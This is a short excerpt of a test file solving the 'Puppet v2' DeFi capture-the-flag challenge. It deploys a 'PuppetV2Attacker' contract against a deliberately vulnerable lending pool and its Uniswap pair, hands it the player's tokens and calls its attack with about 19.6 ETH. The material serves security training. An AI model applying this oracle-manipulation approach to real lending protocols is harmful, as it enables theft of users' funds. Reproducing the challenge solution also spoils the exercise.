...
describe('[Challenge] Puppet v2', function () {
    ...
    it('Execution', async function () {
        ...
        console.log({
            dvt: token.address,
            token0: await uniswapExchange.token0(),
            weth: weth.address,
            token1: await uniswapExchange.token1(),
        });
        const attacker = await (
            await ethers.getContractFactory('PuppetV2Attacker', player)
        ).deploy(uniswapExchange.address, uniswapFactory.address, uniswapRouter.address, token.address, weth.address, lendingPool.address);

        console.log({
            r: ethers.utils.formatUnits(await attacker.getAmountWETHOut(tokenBalance), 'ether'),
        });

        await token.connect(player).transfer(attacker.address, tokenBalance);
        await attacker.connect(player).attack(player.address, { value: 19n * 10n ** 18n + 6n * 10n ** 17n });
    });
